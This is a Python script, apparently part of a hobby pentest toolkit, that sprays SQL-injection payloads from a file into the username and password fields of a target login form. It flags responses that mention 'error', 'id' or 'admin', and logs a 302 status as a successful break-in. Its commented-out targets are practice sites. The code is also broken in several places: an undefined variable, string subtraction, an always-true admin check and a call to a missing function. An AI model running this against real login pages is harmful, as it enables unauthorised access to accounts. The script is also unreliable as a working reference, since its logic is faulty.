#myenv\Scripts\activate
import os
import sys
import asyncio
import re
import requests
from colorama import Fore,init,Style
from datetime import datetime
# import sock
import sqlite3
# from database import create_database_for_Captures
import os
import sys


lib_path = os.path.abspath(os.path.join(os.path.dirname(__file__), '..', 'scripts'))
sys.path.append(lib_path)
import sys
import os

from headers import *



from headers import *

import logging

current_directory = os.path.dirname(os.path.abspath(__file__))
project_root = os.path.abspath(os.path.join(current_directory, '..', '..'))

sys.path.append(project_root)

from logger.logs import logger

############################################################################
attack_type = "authentication bypass SQL injection"
#############################################################################

"""
Function: find_database_links
Description: Searches for database links in a target application.

Dependencies:
- os
- sys
- asyncio
- re
- requests
- colorama (Fore, init, Style)
- datetime
- sqlite3
- headers (from headers import *)
- logging

Note:
- The function searches for patterns or configurations that may indicate the presence of database links.
- The headers for HTTP requests are inspired by https://stackoverflow.com/questions/70017732/how-to-change-the-ip-address-in-the-url.
- The 'headers' module is required for user-agent settings (imported from headers import *).
- Logging is configured to store information in the 'SQLJ.log' file.

Usage:
1. Import the necessary libraries and dependencies.
2. Use the 'find_database_links(urls)' function to search for database links on the specified URLs.

Example:
```python
from sql_injection_exploit import find_database_links

urls_to_search = ["http://example.com", "http://testsite.net"]
for url in urls_to_search:
    asyncio.run(find_database_links(url))
"""





####################################33
pattern = r"\berror\b"
htmlpattern = r"\bid\b"
capturesAUTHBYPASS = []
########################################
#* Setting a couple of user agents
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'
}

###############################################


#
logging.basicConfig(filename="SQLJ.log",level=logging.DEBUG)

response = ""

async def Find_data_base_link(urls):
    try:
        """This is the main block of our exploit program which sending the payloads. """
        global pattern,htmlpattern  
        done = False 
        filename = "finddatabaselink.txt" 
        current_directory = os.path.dirname(os.path.abspath(__file__)) 
        file_path = os.path.join(current_directory, filename) 

        with open(file_path, "r") as file: 
            payload = file.read()
            rows = payload.split("\n") 
            sorted_rows = sorted(rows) 
            sorted_payload = "\n".join(sorted_rows) #* 
            print(f"[{datetime.now()}]",Fore.RED + str(sorted_payload)) 
            requests.packages.urllib3.disable_warnings()  #! Disable SSL warnings for http requests and testing
            # url = "https://redtiger.labs.overthewire.org/level1.php"
            req = requests.get(url=urls,verify=False) 
            # assert req.status_code == 200
            if req.status_code == 200: 
                logger.info(f"Website: {urls} is returning {req.status_code} status")
                ask = input(f"[{datetime.now()}]{Fore.RESET}{Fore.GREEN}{Style.BRIGHT}[INFO]**Looks like the host is up: {Fore.RESET}{Fore.YELLOW}{urls} {Fore.RESET}{Fore.GREEN} \nDo you want to send the payload above to the website?** ")


                if ask.lower() == "y":
                    for line in sorted_payload.split("\n"): 
                        #############################################################33
                        params = { 
                            "username": line,
                            "password": line
                        }
                        ##############################################################################
                        # print(line)
                        await Prepare_the_headers()
                        for headerR in headers:
                            ack = requests.post(url=urls, data=params,verify=False,headers={"User-Agent": header}) 
                            logger.info(f"Testing the payload:{line} on the target:{urls}")
                            await asyncio.sleep(5) 
                            if "error" in ack.text: 
                                logger.info(f"Error parameter may exists in the response code.keyword:{line}")
                                response = ""
                                if len(ack.text) > 100:
                                    try:
                                        response += ack.text[0:100]
                                        logger.info(response)
                                        response -= ack.text[-100:]
                                    
                                    except IndexError:
                                        pass
                                    except NameError:
                                        pass
                                    except ValueError:
                                        pass
                                
                            vuln = re.findall(pattern=pattern,string=ack.text,flags=re.IGNORECASE) 
                            htmlVULN = re.findall(pattern=htmlpattern,string=ack.text,flags=re.IGNORECASE) 
                            if vuln: 
                                logger.info(f"Could find vulnerability id parameter(might exists) in the response code, keyword:{line}")
                                await asyncio.sleep(3) 
                                if len(ack.text) > 100:
                                    try:
                                        response += ack.text[0:100]
                                        logger.info(response)
                                        response -= ack.text[-100:]
                                    
                                    except IndexError:
                                        pass
                                    except NameError:
                                        pass
                                    except ValueError:
                                        pass
                            
                            if htmlVULN:
                                logger.info(f"Could find parameter error(may exists), keyword:{line}")
                                await asyncio.sleep(3)
                                if len(ack.text) > 100:
                                    try:
                                        response += ack.text[0:100]
                                        logger.info(response)
                                        response -= ack.text[-100:]
                                    
                                    except IndexError:
                                        pass
                                    except NameError:
                                        pass
                                    except ValueError:
                                        pass
                            
                            word = "id" in req.text                             
                            errword = "error" in req.text
                            if word:
                                logger.info(f"id parameter may exists in the response code, keyword:{line}")
                                await asyncio.sleep(3)
                                if len(ack.text) > 100:
                                    try:
                                        response += ack.text[0:100]
                                        logger.info(response)
                                        response -= ack.text[-100:]
                                    
                                    except IndexError:
                                        pass
                                    except NameError:
                                        pass
                                    except ValueError:
                                        pass
                            
                            if errword:
                                logger.info(f"error parameter may exists in the response code, keyword:{line}")
                                await asyncio.sleep(3)
                                if len(ack.text) > 100:
                                    try:
                                        response += ack.text[0:100]
                                        logger.info(response)
                                        response -= ack.text[-100:]
                                    
                                    except IndexError:
                                        pass
                                    except NameError:
                                        pass
                                    except ValueError:
                                        pass
                                
                            
                                
                        if req.status_code == 302:                                             
                            logger.info("Could break into the target:{urls},keyword:{line}")
                            done = True
                            
                        
                        if "Admin" or "admin" in vuln or "Admin" or "admin" in ack.text or "Admin" or "admin" in htmlVULN:
                            logger.info(f"Could find admin parameter, keyword:{line}")
                            
                else:
                    logger.info(f"Host {urls} is down.")
        
        #############################################################################################################
    except Exception as e:
        logger.error(f"Error: {e}")
        
    except KeyboardInterrupt:
        pass

    except SystemExit as syse:
        raise syse
        
        
 
        
    finally:
        pass
     
        
        
     

async def auth_main(urL):
    await auth_SQL_inj(urL)

# asyncio.run(Find_data_base_link("http://testfire.net/login.jsp"))
